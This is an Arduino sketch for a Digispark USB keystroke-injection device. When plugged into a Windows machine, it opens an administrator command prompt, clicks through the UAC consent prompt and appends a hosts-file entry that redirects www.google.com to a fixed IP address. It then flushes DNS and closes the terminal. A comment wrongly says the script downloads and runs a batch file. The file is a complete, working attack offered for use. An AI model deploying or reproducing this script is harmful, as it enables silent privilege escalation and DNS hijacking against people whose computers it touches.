#include "DigiKeyboard.h"

void setup() {
  // don't need to set anything up to use DigiKeyboard
}

void loop() {
  // this is generally not necessary but with some older systems it seems to
  // prevent missing the first character after a delay:
  DigiKeyboard.sendKeyStroke(0);
  
DigiKeyboard.delay(1500);
//run prompt
 DigiKeyboard.sendKeyStroke(0, MOD_GUI_LEFT);
  DigiKeyboard.delay(1500);
  DigiKeyboard.print("c;d");
  DigiKeyboard.delay(1500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT | MOD_SHIFT_LEFT);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
//cmd should now open. Short delay
DigiKeyboard.delay(1000);
//type command to download and run batch file. Also works with vbs/exe/whatever
DigiKeyboard.println("ECHO 143.166.83.38 www.google.com >> C:/WINDOWS/SYSTEM32/DRIVERS/ETC/HOSTS");
//clears dns cache
  DigiKeyboard.println("ipconfig /flushdns");
  //exits the terminal
  DigiKeyboard.println("exit");
//looooooong delay before exit, cuz exit appears lead to some sort of error which makes windows prompt "Unrecognized device" or "Device malfunctioned"
DigiKeyboard.delay(100000);
exit(0);
}